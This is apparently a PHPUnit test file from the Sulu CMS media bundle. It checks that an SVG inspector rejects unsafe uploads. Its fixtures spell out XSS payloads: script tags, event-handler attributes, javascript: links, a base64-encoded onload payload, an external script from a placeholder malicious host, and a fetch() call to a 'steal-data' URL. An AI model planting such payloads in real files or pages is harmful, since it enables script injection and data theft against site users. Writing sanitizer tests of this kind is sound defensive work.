<?php

declare(strict_types=1);

/*
 * This file is part of Sulu.
 *
 * (c) Sulu GmbH
 *
 * This source file is subject to the MIT license that is bundled
 * with this source code in the file LICENSE.
 */

namespace Sulu\Bundle\MediaBundle\Tests\Unit\FileInspector;

use PHPUnit\Framework\TestCase;
use Prophecy\PhpUnit\ProphecyTrait;
use Sulu\Bundle\MediaBundle\FileInspector\SvgFileInspector;
use Sulu\Bundle\MediaBundle\FileInspector\SvgSanitizerFactory;
use Sulu\Bundle\MediaBundle\FileInspector\UnsafeFileException;
use Symfony\Component\HttpFoundation\File\UploadedFile;

class SvgFileInspectorTest extends TestCase
{
    use ProphecyTrait;

    public static function provideSvgs(): \Generator
    {
        // Safe SVGs
        yield 'simple svg' => ['<svg></svg>', true];
        yield 'simple svg with text' => ['<svg>text</svg>', true];
        yield 'svg with attributes' => ['<svg width="100" height="100" viewBox="0 0 100 100"></svg>', true];
        yield 'svg with path' => ['<svg><path d="M10 10 H 90 V 90 H 10 L 10 10"/></svg>', true];
        yield 'svg with style' => ['<svg><style>.cls-1{fill:none;}</style><circle class="cls-1" cx="50" cy="50" r="40"/></svg>', true];

        // Potentially unsafe SVGs
        yield 'svg with script tag' => ['<svg><script>alert("XSS")</script></svg>', false];
        yield 'svg with event handler' => ['<svg><circle cx="50" cy="50" r="40" onclick="alert(\'XSS\')"/></svg>', false];
        yield 'svg with iframe' => ['<svg><iframe src="http://example.com"></iframe></svg>', false];
        yield 'svg with external reference' => ['<svg><use xlink:href="http://example.com/image.svg#fragment"/></svg>', false];
        yield 'svg with data URI' => ['<svg><image href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg=="/></svg>', false];
        yield 'svg with javascript in attribute' => ['<svg><a xlink:href="javascript:alert(\'XSS\')">Click me</a></svg>', false];

        // Additional potentially unsafe SVGs
        yield 'svg with onload event' => ['<svg width="100" height="100" onload="alert(\'XSS\')"></svg>', false];
        yield 'svg with foreignObject' => ['<svg><foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert("XSS")</script></body></foreignObject></svg>', false];
        yield 'svg with base64 encoded script' => ['<svg><image href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUyB2aWEgYmFzZTY0IScpIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiPjwv c3ZnPg==" /></svg>', false];
        yield 'svg with setTimeout' => ['<svg><script type="text/javascript">setTimeout(function() { alert("XSS"); }, 1000);</script></svg>', false];
        yield 'svg with external script' => ['<svg><script type="text/javascript" xlink:href="http://malicious.com/xss.js"></script></svg>', false];
        yield 'svg with animate element' => ['<svg><circle cx="50" cy="50" r="40"><animate attributeName="r" from="40" to="20" dur="1s" begin="mouseover" onend="alert(\'XSS\')"/></circle></svg>', false];
        yield 'svg with onclick event in text' => ['<svg><text x="10" y="50" onclick="alert(\'XSS\')">Click me!</text></svg>', false];
        yield 'svg with external fetch' => ['<svg><script>fetch("http://malicious.com/steal-data").then(response => response.text()).then(data => console.log(data));</script></svg>', false];
        yield 'svg with conditional script' => ['<svg><script>if (confirm("Proceed?")) { alert("XSS"); }</script></svg>', false];
        yield 'svg with phishing link' => ['<svg><a href="http://phishing-site.com" target="_blank"><text x="10" y="50">Click here for a prize!</text></a></svg>', false];
    }

    /**
     * @dataProvider provideSvgs
     */
    public function testIsSafe(string $svg, bool $expectedSafe): void
    {
        if (!$expectedSafe) {
            $this->expectException(UnsafeFileException::class);
        }

        $factory = new SvgSanitizerFactory();

        \file_put_contents('test.svg', $svg);
        $uploadedFile = new UploadedFile('test.svg', 'test.svg', 'image/svg+xml');

        $svgSafetyInspector = new SvgFileInspector($factory->create(), $factory->createSafe());

        $result = $svgSafetyInspector->inspect($uploadedFile);

        if ($expectedSafe) {
            $this->assertSame($uploadedFile, $result);
        }
    }
}
